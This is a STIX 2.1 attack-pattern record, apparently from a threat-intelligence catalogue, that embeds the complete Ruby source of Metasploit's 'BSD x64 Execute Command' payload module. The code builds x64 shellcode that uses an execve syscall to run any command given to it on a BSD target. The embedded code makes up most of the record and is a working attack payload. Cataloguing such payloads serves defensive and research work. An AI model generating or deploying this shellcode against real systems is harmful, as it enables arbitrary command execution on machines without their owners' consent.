{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77ea8cde-c89d-410d-91a7-1c3949385dc8",
    "created": "2024-08-14T16:33:19.415046Z",
    "modified": "2024-08-14T16:33:19.41505Z",
    "name": "BSD x64 Execute Command",
    "description": "Execute an arbitrary command",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x64/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# Exec\n# ----\n#\n# Executes an arbitrary command.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 31\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD x64 Execute Command',\n      'Description'   => 'Execute an arbitrary command',\n      'Author'        => 'joev',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X64))\n\n    # Register exec options\n    register_options(\n      [\n        OptString.new('CMD',  [ true,  \"The command string to execute\" ]),\n      ])\n  end\n\n  #\n  # Dynamically builds the exec payload based on the user's options.\n  #\n  def generate(opts={})\n    cmd_str = datastore['CMD'] || ''\n    # Split the cmd string into arg chunks\n    cmd_parts = Shellwords.shellsplit(cmd_str)\n    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact\n    arg_str = cmd_parts.map { |a| \"#{a}\\x00\" }.join\n    call = \"\\xe8\" + [arg_str.length].pack('V')\n    payload =\n      \"\\x48\\x31\\xd2\"+                                 # xor rdx, rdx\n      call +                                          # call CMD.len\n      arg_str  +                                      # CMD\n      \"\\x5f\" +                                        # pop rdi\n      if cmd_parts.length > 1\n        \"\\x48\\x89\\xf9\" +                            # mov rcx, rdi\n        \"\\x52\" +                                    # push rdx (null)\n        # for each arg, push its current memory location on to the stack\n        cmd_parts[1..-1].each_with_index.map do |arg, idx|\n          \"\\x48\\x81\\xc1\" +                        # add rcx + ...\n          [cmd_parts[idx].length+1].pack('V') +   #\n          \"\\x51\"                                  # push rcx (build str array)\n        end.join\n      else\n        \"\\x52\"                                      # push rdx (null)\n      end +\n      \"\\x57\"+                                         # push rdi\n      \"\\x48\\x89\\xe6\"+                                 # mov rsi, rsp\n      \"\\x48\\x31\\xc0\"+                                 # xor rax, rax\n      \"\\x48\\x83\\xc8\\x3b\" +                            # or rax, 0x3b (execve)\n      \"\\x0f\\x05\"                                      # syscall\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}